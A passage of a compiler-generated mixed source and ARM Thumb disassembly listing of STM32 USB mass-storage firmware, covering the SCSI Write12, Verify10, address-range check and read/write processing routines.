 800abac:	7f59      	ldrb	r1, [r3, #29]
 800abae:	2320      	movs	r3, #32
 800abb0:	2205      	movs	r2, #5
 800abb2:	68f8      	ldr	r0, [r7, #12]
 800abb4:	f7ff fc7e 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800abb8:	f04f 33ff 	mov.w	r3, #4294967295
 800abbc:	e0ad      	b.n	800ad1a <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800abbe:	68fb      	ldr	r3, [r7, #12]
 800abc0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800abc4:	68fa      	ldr	r2, [r7, #12]
 800abc6:	33b0      	adds	r3, #176	; 0xb0
 800abc8:	009b      	lsls	r3, r3, #2
 800abca:	4413      	add	r3, r2
 800abcc:	685b      	ldr	r3, [r3, #4]
 800abce:	689b      	ldr	r3, [r3, #8]
 800abd0:	7afa      	ldrb	r2, [r7, #11]
 800abd2:	4610      	mov	r0, r2
 800abd4:	4798      	blx	r3
 800abd6:	4603      	mov	r3, r0
 800abd8:	2b00      	cmp	r3, #0
 800abda:	d00b      	beq.n	800abf4 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800abdc:	7af9      	ldrb	r1, [r7, #11]
 800abde:	233a      	movs	r3, #58	; 0x3a
 800abe0:	2202      	movs	r2, #2
 800abe2:	68f8      	ldr	r0, [r7, #12]
 800abe4:	f7ff fc66 	bl	800a4b4 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800abe8:	697b      	ldr	r3, [r7, #20]
 800abea:	2205      	movs	r2, #5
 800abec:	721a      	strb	r2, [r3, #8]
      return -1;
 800abee:	f04f 33ff 	mov.w	r3, #4294967295
 800abf2:	e092      	b.n	800ad1a <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800abf4:	68fb      	ldr	r3, [r7, #12]
 800abf6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800abfa:	68fa      	ldr	r2, [r7, #12]
 800abfc:	33b0      	adds	r3, #176	; 0xb0
 800abfe:	009b      	lsls	r3, r3, #2
 800ac00:	4413      	add	r3, r2
 800ac02:	685b      	ldr	r3, [r3, #4]
 800ac04:	68db      	ldr	r3, [r3, #12]
 800ac06:	7afa      	ldrb	r2, [r7, #11]
 800ac08:	4610      	mov	r0, r2
 800ac0a:	4798      	blx	r3
 800ac0c:	4603      	mov	r3, r0
 800ac0e:	2b00      	cmp	r3, #0
 800ac10:	d00b      	beq.n	800ac2a <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800ac12:	7af9      	ldrb	r1, [r7, #11]
 800ac14:	2327      	movs	r3, #39	; 0x27
 800ac16:	2202      	movs	r2, #2
 800ac18:	68f8      	ldr	r0, [r7, #12]
 800ac1a:	f7ff fc4b 	bl	800a4b4 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800ac1e:	697b      	ldr	r3, [r7, #20]
 800ac20:	2205      	movs	r2, #5
 800ac22:	721a      	strb	r2, [r3, #8]
      return -1;
 800ac24:	f04f 33ff 	mov.w	r3, #4294967295
 800ac28:	e077      	b.n	800ad1a <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ac2a:	687b      	ldr	r3, [r7, #4]
 800ac2c:	3302      	adds	r3, #2
 800ac2e:	781b      	ldrb	r3, [r3, #0]
 800ac30:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800ac32:	687b      	ldr	r3, [r7, #4]
 800ac34:	3303      	adds	r3, #3
 800ac36:	781b      	ldrb	r3, [r3, #0]
 800ac38:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ac3a:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800ac3c:	687b      	ldr	r3, [r7, #4]
 800ac3e:	3304      	adds	r3, #4
 800ac40:	781b      	ldrb	r3, [r3, #0]
 800ac42:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800ac44:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800ac46:	687a      	ldr	r2, [r7, #4]
 800ac48:	3205      	adds	r2, #5
 800ac4a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800ac4c:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ac4e:	697a      	ldr	r2, [r7, #20]
 800ac50:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac54:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ac56:	687b      	ldr	r3, [r7, #4]
 800ac58:	3306      	adds	r3, #6
 800ac5a:	781b      	ldrb	r3, [r3, #0]
 800ac5c:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800ac5e:	687b      	ldr	r3, [r7, #4]
 800ac60:	3307      	adds	r3, #7
 800ac62:	781b      	ldrb	r3, [r3, #0]
 800ac64:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ac66:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800ac68:	687b      	ldr	r3, [r7, #4]
 800ac6a:	3308      	adds	r3, #8
 800ac6c:	781b      	ldrb	r3, [r3, #0]
 800ac6e:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800ac70:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800ac72:	687a      	ldr	r2, [r7, #4]
 800ac74:	3209      	adds	r2, #9
 800ac76:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800ac78:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ac7a:	697a      	ldr	r2, [r7, #20]
 800ac7c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac80:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800ac82:	697b      	ldr	r3, [r7, #20]
 800ac84:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac88:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac8a:	697b      	ldr	r3, [r7, #20]
 800ac8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac90:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac92:	7af9      	ldrb	r1, [r7, #11]
 800ac94:	68f8      	ldr	r0, [r7, #12]
 800ac96:	f000 f886 	bl	800ada6 <SCSI_CheckAddressRange>
 800ac9a:	4603      	mov	r3, r0
 800ac9c:	2b00      	cmp	r3, #0
 800ac9e:	da02      	bge.n	800aca6 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aca0:	f04f 33ff 	mov.w	r3, #4294967295
 800aca4:	e039      	b.n	800ad1a <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aca6:	697b      	ldr	r3, [r7, #20]
 800aca8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acac:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800acae:	697a      	ldr	r2, [r7, #20]
 800acb0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acb4:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800acb8:	fb02 f303 	mul.w	r3, r2, r3
 800acbc:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800acbe:	697b      	ldr	r3, [r7, #20]
 800acc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acc4:	699b      	ldr	r3, [r3, #24]
 800acc6:	693a      	ldr	r2, [r7, #16]
 800acc8:	429a      	cmp	r2, r3
 800acca:	d00b      	beq.n	800ace4 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800accc:	697b      	ldr	r3, [r7, #20]
 800acce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acd2:	7f59      	ldrb	r1, [r3, #29]
 800acd4:	2320      	movs	r3, #32
 800acd6:	2205      	movs	r2, #5
 800acd8:	68f8      	ldr	r0, [r7, #12]
 800acda:	f7ff fbeb 	bl	800a4b4 <SCSI_SenseCode>
      return -1;
 800acde:	f04f 33ff 	mov.w	r3, #4294967295
 800ace2:	e01a      	b.n	800ad1a <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800ace4:	693b      	ldr	r3, [r7, #16]
 800ace6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800acea:	bf28      	it	cs
 800acec:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800acf0:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800acf2:	697b      	ldr	r3, [r7, #20]
 800acf4:	2201      	movs	r2, #1
 800acf6:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800acf8:	4b0a      	ldr	r3, [pc, #40]	; (800ad24 <SCSI_Write12+0x1e4>)
 800acfa:	7819      	ldrb	r1, [r3, #0]
 800acfc:	697b      	ldr	r3, [r7, #20]
 800acfe:	f103 0210 	add.w	r2, r3, #16
 800ad02:	693b      	ldr	r3, [r7, #16]
 800ad04:	68f8      	ldr	r0, [r7, #12]
 800ad06:	f002 f9ff 	bl	800d108 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800ad0a:	2300      	movs	r3, #0
 800ad0c:	e005      	b.n	800ad1a <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800ad0e:	7afb      	ldrb	r3, [r7, #11]
 800ad10:	4619      	mov	r1, r3
 800ad12:	68f8      	ldr	r0, [r7, #12]
 800ad14:	f000 f90a 	bl	800af2c <SCSI_ProcessWrite>
 800ad18:	4603      	mov	r3, r0
}
 800ad1a:	4618      	mov	r0, r3
 800ad1c:	3718      	adds	r7, #24
 800ad1e:	46bd      	mov	sp, r7
 800ad20:	bd80      	pop	{r7, pc}
 800ad22:	bf00      	nop
 800ad24:	2000010b 	.word	0x2000010b

0800ad28 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800ad28:	b580      	push	{r7, lr}
 800ad2a:	b086      	sub	sp, #24
 800ad2c:	af00      	add	r7, sp, #0
 800ad2e:	60f8      	str	r0, [r7, #12]
 800ad30:	460b      	mov	r3, r1
 800ad32:	607a      	str	r2, [r7, #4]
 800ad34:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ad36:	68fb      	ldr	r3, [r7, #12]
 800ad38:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad3c:	68fb      	ldr	r3, [r7, #12]
 800ad3e:	32b0      	adds	r2, #176	; 0xb0
 800ad40:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad44:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ad46:	697b      	ldr	r3, [r7, #20]
 800ad48:	2b00      	cmp	r3, #0
 800ad4a:	d102      	bne.n	800ad52 <SCSI_Verify10+0x2a>
  {
    return -1;
 800ad4c:	f04f 33ff 	mov.w	r3, #4294967295
 800ad50:	e025      	b.n	800ad9e <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800ad52:	687b      	ldr	r3, [r7, #4]
 800ad54:	3301      	adds	r3, #1
 800ad56:	781b      	ldrb	r3, [r3, #0]
 800ad58:	f003 0302 	and.w	r3, r3, #2
 800ad5c:	2b00      	cmp	r3, #0
 800ad5e:	d008      	beq.n	800ad72 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800ad60:	7af9      	ldrb	r1, [r7, #11]
 800ad62:	2324      	movs	r3, #36	; 0x24
 800ad64:	2205      	movs	r2, #5
 800ad66:	68f8      	ldr	r0, [r7, #12]
 800ad68:	f7ff fba4 	bl	800a4b4 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800ad6c:	f04f 33ff 	mov.w	r3, #4294967295
 800ad70:	e015      	b.n	800ad9e <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800ad72:	697b      	ldr	r3, [r7, #20]
 800ad74:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad78:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad7a:	697b      	ldr	r3, [r7, #20]
 800ad7c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad80:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad82:	7af9      	ldrb	r1, [r7, #11]
 800ad84:	68f8      	ldr	r0, [r7, #12]
 800ad86:	f000 f80e 	bl	800ada6 <SCSI_CheckAddressRange>
 800ad8a:	4603      	mov	r3, r0
 800ad8c:	2b00      	cmp	r3, #0
 800ad8e:	da02      	bge.n	800ad96 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800ad90:	f04f 33ff 	mov.w	r3, #4294967295
 800ad94:	e003      	b.n	800ad9e <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800ad96:	697b      	ldr	r3, [r7, #20]
 800ad98:	2200      	movs	r2, #0
 800ad9a:	60da      	str	r2, [r3, #12]

  return 0;
 800ad9c:	2300      	movs	r3, #0
}
 800ad9e:	4618      	mov	r0, r3
 800ada0:	3718      	adds	r7, #24
 800ada2:	46bd      	mov	sp, r7
 800ada4:	bd80      	pop	{r7, pc}

0800ada6 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800ada6:	b580      	push	{r7, lr}
 800ada8:	b086      	sub	sp, #24
 800adaa:	af00      	add	r7, sp, #0
 800adac:	60f8      	str	r0, [r7, #12]
 800adae:	607a      	str	r2, [r7, #4]
 800adb0:	603b      	str	r3, [r7, #0]
 800adb2:	460b      	mov	r3, r1
 800adb4:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800adb6:	68fb      	ldr	r3, [r7, #12]
 800adb8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800adbc:	68fb      	ldr	r3, [r7, #12]
 800adbe:	32b0      	adds	r2, #176	; 0xb0
 800adc0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800adc4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800adc6:	697b      	ldr	r3, [r7, #20]
 800adc8:	2b00      	cmp	r3, #0
 800adca:	d102      	bne.n	800add2 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800adcc:	f04f 33ff 	mov.w	r3, #4294967295
 800add0:	e012      	b.n	800adf8 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800add2:	687a      	ldr	r2, [r7, #4]
 800add4:	683b      	ldr	r3, [r7, #0]
 800add6:	441a      	add	r2, r3
 800add8:	697b      	ldr	r3, [r7, #20]
 800adda:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adde:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ade0:	429a      	cmp	r2, r3
 800ade2:	d908      	bls.n	800adf6 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ade4:	7af9      	ldrb	r1, [r7, #11]
 800ade6:	2321      	movs	r3, #33	; 0x21
 800ade8:	2205      	movs	r2, #5
 800adea:	68f8      	ldr	r0, [r7, #12]
 800adec:	f7ff fb62 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 800adf0:	f04f 33ff 	mov.w	r3, #4294967295
 800adf4:	e000      	b.n	800adf8 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800adf6:	2300      	movs	r3, #0
}
 800adf8:	4618      	mov	r0, r3
 800adfa:	3718      	adds	r7, #24
 800adfc:	46bd      	mov	sp, r7
 800adfe:	bd80      	pop	{r7, pc}

0800ae00 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ae00:	b590      	push	{r4, r7, lr}
 800ae02:	b085      	sub	sp, #20
 800ae04:	af00      	add	r7, sp, #0
 800ae06:	6078      	str	r0, [r7, #4]
 800ae08:	460b      	mov	r3, r1
 800ae0a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ae0c:	687b      	ldr	r3, [r7, #4]
 800ae0e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ae12:	687b      	ldr	r3, [r7, #4]
 800ae14:	32b0      	adds	r2, #176	; 0xb0
 800ae16:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ae1a:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ae1c:	68fb      	ldr	r3, [r7, #12]
 800ae1e:	2b00      	cmp	r3, #0
 800ae20:	d102      	bne.n	800ae28 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ae22:	f04f 33ff 	mov.w	r3, #4294967295
 800ae26:	e07b      	b.n	800af20 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ae28:	68fb      	ldr	r3, [r7, #12]
 800ae2a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae2e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ae30:	68fa      	ldr	r2, [r7, #12]
 800ae32:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae36:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ae3a:	fb02 f303 	mul.w	r3, r2, r3
 800ae3e:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ae40:	68bb      	ldr	r3, [r7, #8]
 800ae42:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ae46:	bf28      	it	cs
 800ae48:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ae4c:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ae4e:	687b      	ldr	r3, [r7, #4]
 800ae50:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ae54:	687a      	ldr	r2, [r7, #4]
 800ae56:	33b0      	adds	r3, #176	; 0xb0
 800ae58:	009b      	lsls	r3, r3, #2
 800ae5a:	4413      	add	r3, r2
 800ae5c:	685b      	ldr	r3, [r3, #4]
 800ae5e:	691c      	ldr	r4, [r3, #16]
 800ae60:	68fb      	ldr	r3, [r7, #12]
 800ae62:	f103 0110 	add.w	r1, r3, #16
 800ae66:	68fb      	ldr	r3, [r7, #12]
 800ae68:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae6c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800ae6e:	68fb      	ldr	r3, [r7, #12]
 800ae70:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae74:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae78:	4618      	mov	r0, r3
 800ae7a:	68bb      	ldr	r3, [r7, #8]
 800ae7c:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ae80:	b29b      	uxth	r3, r3
 800ae82:	78f8      	ldrb	r0, [r7, #3]
 800ae84:	47a0      	blx	r4
 800ae86:	4603      	mov	r3, r0
 800ae88:	2b00      	cmp	r3, #0
 800ae8a:	da08      	bge.n	800ae9e <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800ae8c:	78f9      	ldrb	r1, [r7, #3]
 800ae8e:	2311      	movs	r3, #17
 800ae90:	2204      	movs	r2, #4
 800ae92:	6878      	ldr	r0, [r7, #4]
 800ae94:	f7ff fb0e 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 800ae98:	f04f 33ff 	mov.w	r3, #4294967295
 800ae9c:	e040      	b.n	800af20 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ae9e:	4b22      	ldr	r3, [pc, #136]	; (800af28 <SCSI_ProcessRead+0x128>)
 800aea0:	7819      	ldrb	r1, [r3, #0]
 800aea2:	68fb      	ldr	r3, [r7, #12]
 800aea4:	f103 0210 	add.w	r2, r3, #16
 800aea8:	68bb      	ldr	r3, [r7, #8]
 800aeaa:	6878      	ldr	r0, [r7, #4]
 800aeac:	f002 f8f4 	bl	800d098 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800aeb0:	68fb      	ldr	r3, [r7, #12]
 800aeb2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aeb6:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aeb8:	68fb      	ldr	r3, [r7, #12]
 800aeba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aebe:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800aec2:	4619      	mov	r1, r3
 800aec4:	68bb      	ldr	r3, [r7, #8]
 800aec6:	fbb3 f3f1 	udiv	r3, r3, r1
 800aeca:	4413      	add	r3, r2
 800aecc:	68fa      	ldr	r2, [r7, #12]
 800aece:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aed2:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800aed4:	68fb      	ldr	r3, [r7, #12]
 800aed6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aeda:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800aedc:	68fb      	ldr	r3, [r7, #12]
 800aede:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aee2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800aee6:	4619      	mov	r1, r3
 800aee8:	68bb      	ldr	r3, [r7, #8]
 800aeea:	fbb3 f3f1 	udiv	r3, r3, r1
 800aeee:	1ad3      	subs	r3, r2, r3
 800aef0:	68fa      	ldr	r2, [r7, #12]
 800aef2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aef6:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800aef8:	68fb      	ldr	r3, [r7, #12]
 800aefa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aefe:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800af00:	68bb      	ldr	r3, [r7, #8]
 800af02:	1ad3      	subs	r3, r2, r3
 800af04:	68fa      	ldr	r2, [r7, #12]
 800af06:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af0a:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800af0c:	68fb      	ldr	r3, [r7, #12]
 800af0e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af12:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af14:	2b00      	cmp	r3, #0
 800af16:	d102      	bne.n	800af1e <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800af18:	68fb      	ldr	r3, [r7, #12]
 800af1a:	2203      	movs	r2, #3
 800af1c:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800af1e:	2300      	movs	r3, #0
}
 800af20:	4618      	mov	r0, r3
 800af22:	3714      	adds	r7, #20
 800af24:	46bd      	mov	sp, r7
 800af26:	bd90      	pop	{r4, r7, pc}
 800af28:	2000010a 	.word	0x2000010a

0800af2c <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800af2c:	b590      	push	{r4, r7, lr}
 800af2e:	b085      	sub	sp, #20
 800af30:	af00      	add	r7, sp, #0
 800af32:	6078      	str	r0, [r7, #4]
 800af34:	460b      	mov	r3, r1
 800af36:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800af38:	687b      	ldr	r3, [r7, #4]
 800af3a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800af3e:	687b      	ldr	r3, [r7, #4]
 800af40:	32b0      	adds	r2, #176	; 0xb0
 800af42:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800af46:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800af48:	68fb      	ldr	r3, [r7, #12]
 800af4a:	2b00      	cmp	r3, #0
 800af4c:	d102      	bne.n	800af54 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800af4e:	f04f 33ff 	mov.w	r3, #4294967295
 800af52:	e08e      	b.n	800b072 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800af54:	68fb      	ldr	r3, [r7, #12]
 800af56:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af5a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af5c:	68fa      	ldr	r2, [r7, #12]
 800af5e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af62:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800af66:	fb02 f303 	mul.w	r3, r2, r3
 800af6a:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800af6c:	68bb      	ldr	r3, [r7, #8]
 800af6e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800af72:	bf28      	it	cs
 800af74:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800af78:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800af7a:	687b      	ldr	r3, [r7, #4]
 800af7c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800af80:	687a      	ldr	r2, [r7, #4]
 800af82:	33b0      	adds	r3, #176	; 0xb0
 800af84:	009b      	lsls	r3, r3, #2
 800af86:	4413      	add	r3, r2
 800af88:	685b      	ldr	r3, [r3, #4]
 800af8a:	695c      	ldr	r4, [r3, #20]
 800af8c:	68fb      	ldr	r3, [r7, #12]
 800af8e:	f103 0110 	add.w	r1, r3, #16
 800af92:	68fb      	ldr	r3, [r7, #12]
 800af94:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af98:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800af9a:	68fb      	ldr	r3, [r7, #12]
 800af9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afa0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800afa4:	4618      	mov	r0, r3
 800afa6:	68bb      	ldr	r3, [r7, #8]
 800afa8:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800afac:	b29b      	uxth	r3, r3
 800afae:	78f8      	ldrb	r0, [r7, #3]
